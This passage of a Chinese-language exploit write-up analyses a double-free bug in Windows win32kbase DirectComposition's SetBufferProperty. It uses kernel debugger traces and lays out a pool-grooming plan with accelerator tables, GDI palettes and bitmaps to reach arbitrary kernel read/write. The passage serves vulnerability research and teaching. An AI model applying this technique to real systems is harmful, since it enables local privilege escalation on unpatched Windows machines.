    kd> dd ffff8785c4170000 l1
    ffff8785`c4170000  0000000b
这里我们通过第二小节中的分析，修改了正确的 szbuf 大小，因此可以顺利进入 SetBufferProperty 函数中。
    kd> p
    win32kbase!DirectComposition::CApplicationChannel::ProcessCommandBufferIterator+0x217:
    ffff87e7`8d3f45d7 498bca          mov     rcx,r10
    //*************跳转到SetBufferProperty
    kd> p
    win32kbase!DirectComposition::CApplicationChannel::ProcessCommandBufferIterator+0x21a:
    ffff87e7`8d3f45da ff1568270d00    call    qword ptr [win32kbase!_guard_dispatch_icall_fptr (ffff87e7`8d4c6d48)]
    kd> t
    win32kbase!guard_dispatch_icall_nop:
    ffff87e7`8d4179f0 ffe0            jmp     rax
    kd> p
    win32kbase!DirectComposition::CExpressionMarshaler::SetBufferProperty:
    ffff87e7`8d3f37c0 4c8bdc          mov     r11,rsp
第三步，进入 SetBufferProperty，首先会分配一个池空间用于准备存放 hresource 的 databuf，返回指向这个池的指针A。
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d70d:
    ffff87e7`8d43d4cd e89e39fbff      call    win32kbase!Win32AllocPoolWithQuota (ffff87e7`8d3f0e70)
    //***********分配池空间大小0x4c，正好是databuf的大小
    kd> r rcx
    rcx=000000000000004c
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d712:
    ffff87e7`8d43d4d2 48894758        mov     qword ptr [rdi+58h],rax
    //*************rax存放的是指向池空间的指针A
    kd> r rax
    rax=ffff8785c01463f0
    kd> !pool ffff8785c01463f0
     ffff8785c0146000 size:  3b0 previous size:    0  (Allocated)  Gfnt
     ffff8785c01463b0 size:   30 previous size:  3b0  (Free)       Free
     //*************当前池处于Allocated状态
    *ffff8785c01463e0 size:   60 previous size:   30  (Allocated) *DCdn Process: eba5d6c42906b9b2       Owning component : Unknown (update pooltag.txt)
     ffff8785c0146440 size:   60 previous size:   60  (Allocated)  CSMr
第四步，在向池空间拷贝 databuf 前，会先调用 win32kbase!StringCbLengthW 获得 databuf 的大小，但是如果
StringCbLengthW 返回错误，则会释放掉这个池空间。
    //*************调用StringCbLengthW函数
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d726:
    ffff87e7`8d43d4e6 e849b30300      call    win32kbase!StringCbLengthW (ffff87e7`8d478834)
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d72b:
    ffff87e7`8d43d4eb 85c0            test    eax,eax
    //**********函数失败返回NTSTATUS
    kd> r eax
    eax=80070057
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d72d:
    ffff87e7`8d43d4ed 782c            js      win32kbase! ?? ::FNODOBFM::`string'+0x1d75b (ffff87e7`8d43d51b)
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d75b:
    ffff87e7`8d43d51b 488b4f58        mov     rcx,qword ptr [rdi+58h]
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d75f:
    ffff87e7`8d43d51f bb0d0000c0      mov     ebx,0C000000Dh
    //********失败后调用FreePool
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d764:
    ffff87e7`8d43d524 e8272af9ff      call    win32kbase!Win32FreePool (ffff87e7`8d3cff50)
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d769:
    ffff87e7`8d43d529 90              nop
    kd> !pool ffff8785c01463f0
    Pool page ffff8785c01463f0 region is Unknown
     ffff8785c0146000 size:  3b0 previous size:    0  (Allocated)  Gfnt
     ffff8785c01463b0 size:   30 previous size:  3b0  (Free)       Free
     //*********可以看到申请的池现在是Free状态
    *ffff8785c01463e0 size:   60 previous size:   30  (Free ) *DCdn Process: 145a77c888d83932
            Owning component : Unknown (update pooltag.txt)
     ffff8785c0146440 size:   60 previous size:   60  (Allocated)  CSMr
但是释放后，没有对指针进行置 NULL，导致调用 ReleaseResource 时，会再次释放这个池空间，最后导致 double free 的发生。
    //*********调用ReleaseResource函数后会调用CBaseExpressionMarsharler
    kd> g
    Breakpoint 3 hit
    win32kbase!DirectComposition::CBaseExpressionMarshaler::~CBaseExpressionMarshaler:
    ffff87e7`8d3f2d40 4053            push    rbx
    kd> kb
    RetAddr           : Args to Child                                                           : Call Site
    ffff87e7`8d3f3b74 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : win32kbase!DirectComposition::CBaseExpressionMarshaler::~CBaseExpressionMarshaler
    ffff87e7`8d3f3d7a : ffff8785`c1b94970 00000000`00000000 00000000`00000000 00000000`00000297 : win32kbase!DirectComposition::CExpressionMarshaler::`scalar deleting destructor'+0x14
    00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : win32kbase!DirectComposition::CApplicationChannel::ReleaseResource+0x1ea
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d688:
    ffff87e7`8d43d448 e8032bf9ff      call    win32kbase!Win32FreePool (ffff87e7`8d3cff50)
    //**********释放这个已Free的指针
    kd> r rcx
    rcx=ffff8785c01463f0
    kd> !pool ffff8785c01463f0
    Pool page ffff8785c01463f0 region is Unknown
     ffff8785c0146000 size:  3b0 previous size:    0  (Allocated)  Gfnt
     ffff8785c01463b0 size:   30 previous size:  3b0  (Free)       Free
     //*********当前已处于释放状态
    *ffff8785c01463e0 size:   60 previous size:   30  (Free ) *DCdn Process: 145a77c888d83932
            Owning component : Unknown (update pooltag.txt)
     ffff8785c0146440 size:   60 previous size:   60  (Allocated)  CSMr
    //***********最终引发bugcheck，double free 
    BAD_POOL_CALLER (c2)
    The current thread is making a bad pool request.  Typically this is at a bad IRQL level or double freeing the same allocation, etc.
    Arguments:
    Arg1: 0000000000000007, Attempt to free pool which was already freed
关于为什么 StringCbLengthW 函数会失败，在后面利用的过程中我会提到，因为想利用这个漏洞，我们需要它后 面返回成功，实现 szbuf
对内核空间的数据拷贝。
#### 0x03 GDI Data Attack!--从Double Free到write what where
其实我六月份开始写这个漏洞的时候关于 GDI attack 的方法我没有找到 paper，导致用 palette 的时候逆向了很多函数，最后写了这个
exp，后来有了几篇关于 GDI 的 paper，讲述的还是比较详细的，后面我会给这个 paper 的链接。
其实我也思考了关于 bitmap 的方法，其实理论上应该也可以的，但我在 google 上当时搜到了一篇文章，提到了一句关于
palette的信息，当时那篇paper上说 palette 的 kernel object 结构更简单，如果用 bitmap 的话，如果覆盖 bitmap
的 kernel object 的其他结构的话，可能导致在其他时候会产生一些问题，在内核漏洞利用中如果产生 crash 可能直接就 bsod 了...
在这个 double free 中完全可以只用 palette 来完成攻击，因为之前做 bitmap 比较多，对 bitmap 比较熟悉，因此在我的
exploit 中，palette 只起到一个过渡作用，最终还是通过 bitmap 来完成任意地址读写。
关于这个 double free 的利用思路是，首先在第一次 free 的时候会产生一个 hole，然后我们用 palette 占用这个
hole，然后第二次 free 的时候实际上释放的是这个 palette，然而因为不是通过 deleteobject 释放 palette，这个
palette 的 handle 并没有被消除，这样我们可以通过第三次用可控的 kernel object 填充，从而控制 palette
的内核对象空间，而我们还可以对 palette 的句柄进行操作，这个过程完成 double free -> use after free -> write
what where 的过程。
OK，第一步我们需要创造一个稳定的内核空洞，比较巧的是 SetBufferProperty 创建的这个 pool 是一个 session paged
pool，而Accelerator 的 kernel object 也是一个 session paged pool，而 GDI 的 palette 和
bitmap 也是 session paged pool，因此我使用了 Nicolas Economous 的方法来制造这个稳定的pool
hole（）。
    //step 1
    kd> p
    _dark_composition_+0x18c7:
    0033:00007ff6`25ca18c7 4d8bc6          mov     r8,r14
    kd> p
    _dark_composition_+0x18ca:
    0033:00007ff6`25ca18ca b901000000      mov     ecx,1
    kd> r r8
    r8=ffff8ace81fa9310
    kd> !pool ffff8ace81fa9310
    Pool page ffff8ace81fa9310 region is Paged session pool
    ffff8ace81fa9000 is not a valid large pool allocation, checking large session pool...
     ffff8ace81fa9260 size:   20 previous size:    0  (Allocated)  Frag
     ffff8ace81fa9280 size:   10 previous size:   20  (Free)       Free
     ffff8ace81fa9290 size:   70 previous size:   10  (Allocated)  Uswe
     //*********创建Accelerator kernel object
    *ffff8ace81fa9300 size:  100 previous size:   70  (Allocated) *Usac Process: ffffa6018eb56080
            Pooltag Usac : USERTAG_ACCEL, Binary : win32k!_CreateAcceleratorTable
    ……
    //step 2
    kd> g
    Break instruction exception - code 80000003 (first chance)
    _dark_composition_+0x2460:
    0033:00007ff6`25ca2460 cc              int     3
    kd> !pool ffff8ace81fa9310
    Pool page ffff8ace81fa9310 region is Paged session pool
    ffff8ace81fa9000 is not a valid large pool allocation, checking large session pool...
     ffff8ace81fa9260 size:   20 previous size:    0  (Allocated)  Frag
     ffff8ace81fa9280 size:   10 previous size:   20  (Free)       Free
     ffff8ace81fa9290 size:   70 previous size:   10  (Allocated)  Uswe
     //******DeleteAccelerator制造pool hole
    *ffff8ace81fa9300 size:  100 previous size:   70  (Free ) *Usac
            Pooltag Usac : USERTAG_ACCEL, Binary : win32k!_CreateAcceleratorTable
我通过 DeleteAccelerator 释放这个 Accelerator 制造了一个 pool hole，随后我们调用
SetBufferProperty 来占用这个 pool hole，之后由于 StringCbLengthW 失败，这个 pool hole
又会被释放出来。
    //step 1
    kd> p